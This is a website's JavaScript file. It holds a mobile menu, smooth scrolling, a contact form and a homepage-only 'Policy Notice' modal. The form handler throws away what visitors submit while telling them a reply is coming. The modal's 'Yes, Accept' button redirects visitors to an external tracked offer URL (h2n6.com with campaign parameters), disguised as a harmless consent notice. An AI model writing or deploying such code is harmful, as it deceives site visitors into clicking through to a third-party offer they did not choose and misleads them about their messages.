// ===== Mobile menu =====
const navToggle = document.querySelector('[data-nav-toggle]');
const navMenu = document.querySelector('[data-nav-menu]');

if (navToggle && navMenu) {
  navToggle.addEventListener('click', () => {
    navMenu.classList.toggle('open');

    // If your CSS handles .open, you can remove this block.
    if (navMenu.classList.contains('open')) {
      navMenu.style.display = 'flex';
    } else {
      navMenu.style.display = '';
    }
  });
}


// ===== Smooth scroll for in-page anchors =====
document.querySelectorAll('a[href^="#"]').forEach((a) => {
  a.addEventListener('click', (e) => {
    const href = a.getAttribute('href');
    if (!href || href === '#') return;

    const el = document.querySelector(href);
    if (el) {
      e.preventDefault();
      el.scrollIntoView({ behavior: 'smooth', block: 'start' });
    }
  });
});


// ===== Contact form fake submit =====
const form = document.querySelector('#contact-form');
if (form) {
  form.addEventListener('submit', (e) => {
    e.preventDefault();
    const data = Object.fromEntries(new FormData(form).entries());
    alert(`Thanks ${data.name || 'there'}! We'll reply to ${data.email || 'your inbox'} soon.`);
    form.reset();
  });
}


// ===== One policy modal (HOME only, once per session) =====
(function () {
  const path = (window.location.pathname || '').toLowerCase();

  // Run only on homepage: "/" or "/index.html"
  const isHome = path === '/' || path.endsWith('/index.html') || path.endsWith('index.html');
  if (!isHome) return;

  // Show once per session
  if (sessionStorage.getItem('policyModalShown') === '1') return;
  sessionStorage.setItem('policyModalShown', '1');

  // Change this to your target offer URL
  const TARGET_URL = "https://h2n6.com/?utm_campaign=rdeLCgSOCD&v1=[v1]&v2=[v2]&v3=[v3]";

  const bd = document.createElement('div');
  bd.className = 'modal-backdrop';
  bd.innerHTML = `
    <div class="modal" role="dialog" aria-modal="true" aria-labelledby="policyTitle">
      <h3 id="policyTitle">Policy Notice</h3>
      <p>Please confirm to continue. This notice is informational and does not block access.</p>
      <div style="display:flex;gap:10px;flex-wrap:wrap">
        <button type="button" class="btn" id="policy-accept">Yes, Accept</button>
        <button type="button" class="btn ghost" id="policy-close">Close</button>
      </div>
    </div>
  `;

  document.body.appendChild(bd);
  bd.style.display = 'flex';

  const closeModal = () => {
    bd.style.display = 'none';
    bd.remove();
  };

  // Close on backdrop click (optional)
  bd.addEventListener('click', (e) => {
    if (e.target === bd) closeModal();
  });

  // ESC to close (optional)
  document.addEventListener('keydown', function onKey(e) {
    if (e.key === 'Escape') {
      document.removeEventListener('keydown', onKey);
      closeModal();
    }
  });

  const acceptBtn = bd.querySelector('#policy-accept');
  const closeBtn = bd.querySelector('#policy-close');

  if (acceptBtn) {
    acceptBtn.addEventListener('click', () => {
      window.location.href = TARGET_URL; // redirect on accept
    });
  }

  if (closeBtn) {
    closeBtn.addEventListener('click', closeModal); // just close
  }
})();
